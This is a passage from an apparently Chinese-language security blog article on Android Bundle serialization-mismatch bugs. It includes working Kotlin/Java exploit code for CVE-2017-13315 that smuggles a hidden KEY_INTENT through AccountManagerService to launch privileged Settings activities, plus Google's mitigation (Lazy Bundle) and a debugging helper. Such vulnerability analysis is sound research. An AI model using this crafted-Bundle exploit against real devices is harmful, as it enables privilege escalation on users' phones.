p.writeInt(length)
p.setDataPosition(0)
```

在上述 POC 中，我们明面上构造了一个含有 3 个元素的 Bundle，分别是:

* A0: Parcelable 类型，元素为我们带有漏洞的 Parcelable；
* A1: ByteArray 类型，长度可以通过记录dataPosition计算得到，ByteArray 的内容为隐藏的 Intent 元素；
* A2: NULL 类型；

其中关键的是 A1 的 key，在触发漏洞后，会被解析为第二个元素的元素类型和长度，即解析出来的内容为:

- 00 00 00 0d: 解析为键值对中的值类型，等于 VAL_BYTEARRAY(13)；
- 00 00 00 08: 解析为 ByteArray 长度，即 8 字节；注意这里额外的 0 是字符串写入时候 pad 出来的。

之所以是 8 字节，是为了把后面的长度字段吞掉，使得解析下一个元素可以直接到我们隐藏的 intent 中。

第三个元素 A2 只是用于占位，在第一次序列化时候有用，第二次时直接被我们隐藏的 intent 替代了。上述代码的运行结果如下:

```bash
I/ecool: A = Bundle(items = 3) length: 160
    	   => A(41) = VAL_PARCELABLE:com.ecool.test.Vulnerable{}
    	   => �(d0008) = VAL_BYTEARRAY:0600000069006e00740065006e00740000000000010000002a000000
    	   => BBBBBB(424242424242) = VAL_NULL:null
I/ecool: A.containsKey: false
I/ecool: B = Bundle(items = 3) length: 140
    	   => intent(696e74656e74) = VAL_INTEGER:42
    	   => null = VAL_BYTEARRAY:0d0000001c000000
    	   => A(41) = VAL_PARCELABLE:com.ecool.test.Vulnerable{}
I/ecool: B.containsKey: true
```

![image-20230222224342112](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230222224342112.png)

通过对比可以看到在第一次反序列化和和第二次反序列化的结果不一致，成功伪造了`intent=>42`键值对。既然我们能够隐藏这个键值对，就能够绕过第一次的检查进行利用。

以AccountManagerService的漏洞利用（CVE-2017-13315）为例，利用这个漏洞，我们可以达到LaunchAnyWhere的效果，如下所示。

![image-20230223014521087](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230223014521087.png)

1. 应用程序启动系统Activity以显示帐户选择器（例如`ChooseTypeAndAccountActivity`函数） 

2. 系统Activity请求`AccountManagerService`使用帐户验证器执行操作 

3. `system_server`中的`AccountManagerService`绑定到验证器 

4. `AccountManagerService`调用Account Authenticator上的方法并从中获取响应 

5. `AccountManagerService`检查Authenticator返回的Bundle，如果它指定了指向不属于Authenticator的Activity的KEY_INTENT，结果将被拒绝。 

6. 如果一切正常，`AccountManagerService`将结果Bundle发送回系统Activity 

7. 如果结果 Bundle中含有KEY_INTENT，则系统Activity将启动给定的Activity

上次过程涉及到两次跨进程的序列化数据传输。第一次，攻击者App将Bundle序列化后通过Binder传递给`system_server`，然后`system_server`通过Bundle的一系列getXXX（如`getBoolean`、`getParcelable`)函数触发反序列化，获得KEY_INTENT这个键的值——一个intent对象，进行安全检查。若检查通过，调用writeBundle进行第二次序列化，然后Settings中反序列化后重新获得`{KEY_INTENT:intent}`，调用startActivity。漏洞的关键在于，intent可以由攻击者App指定，那么由于Settings应用为高权限应用（uid=1000），因此可以拉起手机中其他高权限的Activity，从而造成LaunchAnyWhere。

在`DcParamObject`类中，对比`writeToParcel`和`readFromParcel`函数，明显存在Bundle Mismatch

```java
public void writeToParcel(Parcel dest, int flags) {
    dest.writeLong(mSubId);
}
private void readFromParcel(Parcel in) {
    mSubId = in.readInt();
}
```

构造如下Bundle

```kotlin
val evilBundle = Bundle()
val bndlData = Parcel.obtain()
val pcelData = Parcel.obtain()

// Manipulate the raw data of bundle Parcel
// Now we replace this right Parcel data to evil Parcel data
pcelData.writeInt(3) // number of elements in ArrayMap

/*****************************************/
// mismatched object
pcelData.writeString("mismatch")
pcelData.writeInt(Type.VAL_PARCELABLE) // VAL_PACELABLE

pcelData.writeString("com.android.internal.telephony.DcParamObject") // name of Class Loader

pcelData.writeInt(1) //mSubId


pcelData.writeInt(1)
pcelData.writeInt(6)
pcelData.writeInt(13)

pcelData.writeInt(-1) // dummy, will hold the length

val keyIntentStartPos = pcelData.dataPosition()
// Evil object hide in ByteArray
pcelData.writeString(AccountManager.KEY_INTENT)
pcelData.writeInt(4)
pcelData.writeString("android.content.Intent") // name of Class Loader
pcelData.writeString(Intent.ACTION_RUN) // Intent Action
Uri.writeToParcel(pcelData, null) // Uri is null
pcelData.writeString(null) // mType is null
pcelData.writeInt(0x10000000) // Flags
pcelData.writeString(null) // mPackage is null
pcelData.writeString("com.android.settings")
pcelData.writeString("com.android.settings.password.ChooseLockPassword")
pcelData.writeInt(0) //mSourceBounds = null
pcelData.writeInt(0) // mCategories = null
pcelData.writeInt(0) // mSelector = null
pcelData.writeInt(0) // mClipData = null
pcelData.writeInt(-2) // mContentUserHint
pcelData.writeBundle(null)

val keyIntentEndPos = pcelData.dataPosition()
val lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos
pcelData.setDataPosition(keyIntentStartPos - 4) // backpatch length of KEY_INTENT
pcelData.writeInt(lengthOfKeyIntent)
pcelData.setDataPosition(keyIntentEndPos)
Log.d(TAG, "Length of KEY_INTENT is " + Integer.toHexString(lengthOfKeyIntent))

///////////////////////////////////////
pcelData.writeString("Padding-Key")
pcelData.writeInt(0) // VAL_STRING
pcelData.writeString("Padding-Value") //

val length = pcelData.dataSize()
Log.d(TAG, "length is " + Integer.toHexString(length))
bndlData.writeInt(length)
bndlData.writeInt(0x4c444E42)
bndlData.appendFrom(pcelData, 0, length)
bndlData.setDataPosition(0)
evilBundle.readFromParcel(bndlData)
Log.d(TAG, evilBundle.toString())
return evilBundle
```

新建`AuthService`，当`addAcount`函数被调用时，会返回`addAccountResponse`

```java
public class AuthService extends Service {
    public static Bundle addAccountResponse;
    @Override
    public IBinder onBind(Intent intent) {
        return new Authenticator(this).getIBinder();
    }
    private static class Authenticator extends AbstractAccountAuthenticator {
        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
            return addAccountResponse;
        }

        ...
```

最后将`AccountResponse`指定为我们设置的恶意Bundle，即可实现LaunchAnyWhere

```java
AuthService.addAccountResponse = getEvilBundle();
startActivity(new Intent()
        .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
        .putExtra("allowableAccountTypes", new String[] {"com.example.test.account"})
```



### 如何使“风水”Bundle更安全

针对上述的问题，Google提出了以下几种修复方案：

- 修复有问题的类，例如上文中的 `Vulnerable`，但是这并不能保证完全杜绝这一类的问题，如下表所示

  |    漏洞编号    | 漏洞源                    | 漏洞编号       | 漏洞源                  |
  | :------------: | ------------------------- | -------------- | ----------------------- |
  | CVE-2017-0806  | GateKeeperResponse        | CVE-2018-9471  | NanoAppFilter           |
  | CVE-2017-0664  | AccessibilityNodelnfo     | CVE-2018-9474  | MediaPlayerTrackInfo    |
  | CVE-2017-13288 | PeriodicAdvertisingReport | CVE-2018-9522  | StatsLogEventWrapper    |
  | CVE-2017-13289 | ParcelableRttResults      | CVE-2018-9523  | Parcel.wnteMapInternal0 |
  | CVE-2017-13286 | OutputConfiguration       | CVE-2021-0748  | ParsingPackagelmpl      |
  | CVE-2017-13287 | VerifyCredentialResponse  | CVE-2021-0928  | OutputConfiguration     |
  | CVE-2017-13310 | ViewPager’s SavedState    | CVE-2021-0685  | ParsedIntentInfol       |
  | CVE-2017-13315 | DcParamObject             | CVE-2021-0921  | ParsingPackagelmpl      |
  | CVE-2017-13312 | ParcelableCasData         | CVE-2021-0970  | GpsNavigationMessage    |
  | CVE-2017-13311 | ProcessStats              | CVE-2021-39676 | AndroidFuture           |
  | CVE-2018-9431  | OSUInfo                   | CVE-2022-20135 | GateKeeperResponse      |

  …

- 修复思路是修复漏洞本身，即确保检查和使用的反序列化对象是相同的，但这种修复方案也是治标不治本，同样可能会被攻击者找到其他的攻击路径并绕过

可见上述的两种方案都不是最佳的解决方案，为了彻底解决该类问题，Google提出了Lazy Bundle方案，即从Bundle类入手，在现有的Bundle方案中，存在两个缺陷

* Bundle的结构被其携带的键值对所定义，当出现读写 Mismatch时，其后项的读也会受到影响，
* 二是在首次检索或查询时就进行了反序列化（例如，当我们只需要读取其中一个元素时，也需要反序列化整个Bundle）

针对上述第一点，将每一个键值对的长度固定下来并作为前缀记录即可解决；针对第二点，我们可以通过已经记录下来的length prefix，跳过不需要读取的键值对，仅读取需要的那一项

### CVE-2021-0928

#### 





## 再起波澜：CVE-2022-20452







## 附录

### 附录一：测试环境以及参考代码

为了准确地获取序列化对象在内存中的状态，可以将对象转化为byte数组，再输出到文件中，相关的代码如下所示

```java
public class Tool {
    public static byte[] marshall(Parcelable parceable) {
        Parcel parcel = Parcel.obtain();
        parceable.writeToParcel(parcel, 0);
        byte[] bytes = parcel.marshall();
        parcel.recycle();
        return bytes;
    }

    public static Parcel unmarshall(byte[] bytes) {
        Parcel parcel = Parcel.obtain();
        parcel.unmarshall(bytes, 0, bytes.length);
        parcel.setDataPosition(0); // This is extremely important!
        return parcel;
    }

    public static <T> T unmarshall(byte[] bytes, Parcelable.Creator<T> creator) {
        Parcel parcel = unmarshall(bytes);
        T result = creator.createFromParcel(parcel);
        parcel.recycle();
        return result;
    }

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }


    public static void writeSerializationFile(byte[] bytes, String fileName) {
        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + fileName);
        if(!file.exists()){
            File parentFile = file.getParentFile();
            if(!parentFile.exists()){
                parentFile.mkdirs();
            }
            try{
                file.createNewFile();
            }catch (IOException e){
                e.printStackTrace();
            }

        }
        try{
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes, 0, bytes.length);
            fos.flush();
            fos.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    
    // 解析并打印Bundle结构
    public static String inspect(Bundle bundle){
        String result = "";
        result += "Bundle(items = " + bundle.size() + ") length: " + marshall(bundle).length + "\n";
        Set<String> keys = bundle.keySet();
        for(String key : keys){
            result += "\t   => " + getKey(key) + " = " + getValue(bundle, key) + "\n";
        }
        return result;
    }

    private static String getKey(String key){
        if(key.length() == 0){
            return "null";
        }
        return key + "(" + String.format("%x", new BigInteger(1, key.getBytes(StandardCharsets.UTF_8))) + ")";

    }

    private static String getValue(Bundle bundle, String key){
        Object v = bundle.get(key);
        String resultType;
        if (v == null) {
            resultType = "VAL_NULL";
            resultType += ":" + "null";
        } else if (v instanceof String) {
            resultType = "VAL_STRING";
            resultType += ":" + v;
        } else if (v instanceof Integer) {
            resultType = "VAL_INTEGER";
            resultType += ":" + v;
        } else if (v instanceof Map) {
            resultType = "VAL_MAP";
            resultType += ":" + v;
        } else if (v instanceof Bundle) {
            // Must be before Parcelable
            resultType = "VAL_BUNDLE";
            resultType += ":" + v.toString();
        } else if (v instanceof PersistableBundle) {
            resultType = "VAL_PERSISTABLEBUNDLE";
        } else if (v instanceof Parcelable) {
            // IMPOTANT: cases for classes that implement Parcelable must
            // come before the Parcelable case, so that their specific VAL_*
            // types will be written.
            resultType = "VAL_PARCELABLE";
            resultType += ":" + v.getClass().getName() + "{" + "}";
        } else if (v instanceof Short) {
            resultType = "VAL_SHORT";
            resultType += ":" + v;
        } else if (v instanceof Long) {
            resultType = "VAL_LONG";
            resultType += ":" + v;
        } else if (v instanceof Float) {
            resultType = "VAL_FLOAT";
            resultType += ":" + v;
        } else if (v instanceof Double) {
            resultType = "VAL_DOUBLE";
            resultType += ":" + v;
        } else if (v instanceof Boolean) {
            resultType = "VAL_BOOLEAN";
            resultType += ":" + v;
        } else if (v instanceof CharSequence) {
            // Must be after String
            resultType = "VAL_CHARSEQUENCE";
            resultType += ":" + v;
        } else if (v instanceof List) {
            resultType = "VAL_LIST";
            resultType += ":" + v.toString();
        } else if (v instanceof SparseArray) {
            resultType = "VAL_SPARSEARRAY";
            resultType += ":" + v.toString();
        } else if (v instanceof boolean[]) {
            resultType = "VAL_BOOLEANARRAY";
            resultType += ":" + v.toString();
        } else if (v instanceof byte[]) {
            resultType = "VAL_BYTEARRAY";
            resultType += ":" + Tool.byteArrayToHex((byte[]) v);
        } else if (v instanceof String[]) {
            resultType = "VAL_STRINGARRAY";
            resultType += ":" + v.toString();
        } else if (v instanceof CharSequence[]) {
            // Must be after String[] and before Object[]
            resultType = "VAL_CHARSEQUENCEARRAY";
        } else if (v instanceof IBinder) {
            resultType = "VAL_IBINDER";
            resultType += ":" + ((IBinder) v).toString();
        } else if (v instanceof Parcelable[]) {
            resultType = "VAL_PARCELABLEARRAY";
        } else if (v instanceof int[]) {
            resultType = "VAL_INTARRAY";
        } else if (v instanceof long[]) {
            resultType = "VAL_LONGARRAY";
        } else if (v instanceof Byte) {
            resultType = "VAL_BYTE";
        } else if (v instanceof Size) {
            resultType = "VAL_SIZE";
        } else if (v instanceof SizeF) {
            resultType = "VAL_SIZEF";
        } else if (v instanceof double[]) {
            resultType = "VAL_DOUBLEARRAY";
        } else {
            Class<?> clazz = v.getClass();
            if (clazz.isArray() && clazz.getComponentType() == Object.class) {
                // Only pure Object[] are written here, Other arrays of non-primitive types are
                // handled by serialization as this does not record the component type.
                resultType = "VAL_OBJECTARRAY";
            } else if (v instanceof Serializable) {
                // Must be last
                resultType = "VAL_SERIALIZABLE";
            } else {
                throw new RuntimeException("Parcel: unable to marshal value " + v);
            }
        }
        return resultType;
    }

    private static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
            sb.append(String.format("%02x", b));
        return sb.toString();
    }
}
```

当然，在将字节dump到本地之前，需要授予文件读写的权限

```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
```

之后就可以将字节码dump下来查看了

## 参考文献

- [Android序列化与反序列化不匹配漏洞 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/372735662)
- [GitHub - michalbednarski/ReparcelBug: CVE-2017-0806 PoC (Android GateKeeperResponse writeToParcel/createFromParcel mismatch)](https://github.com/michalbednarski/ReparcelBug)
- [GitHub - michalbednarski/LeakValue: Exploit for CVE-2022-20452, privilege escalation on Android from installed app to system app (or another app) via LazyValue using Parcel after recycle()](https://github.com/michalbednarski/LeakValue)
- [GitHub - michalbednarski/ReparcelBug2: Writeup and exploit for installed app to system privilege escalation on Android 12 Beta through CVE-2021-0928, a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration`](https://github.com/michalbednarski/ReparcelBug2)
- [再谈Parcelable反序列化漏洞和Bundle mismatch – 小路的博客 (wrlus.com)](https://wrlus.com/android-security/bundle-mismatch/)
- [EvilParcel vulnerabilities analysis / Habr](https://habr.com/en/company/drweb/blog/457610/)
- [Android Parcels: The Bad, the Good and the Better - Introducing Android &Safer Parcel - Black Hat Europe 2022 | Briefings Schedule](https://www.blackhat.com/eu-22/briefings/schedule/index.html#android-parcels-the-bad-the-good-and-the-better---introducing-androids-safer-parcel-28404)
- [Android 反序列化漏洞攻防史话 - evilpan](https://evilpan.com/2023/02/18/parcel-bugs/#漏洞修复)
- [Bundle风水——Android序列化与反序列化不匹配漏洞详解](https://xz.aliyun.com/t/2364)
- [launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048 ) - 360 核心安全技术博客](https://blogs.360.net/post/launchanywhere-google-bug-7699048.html)
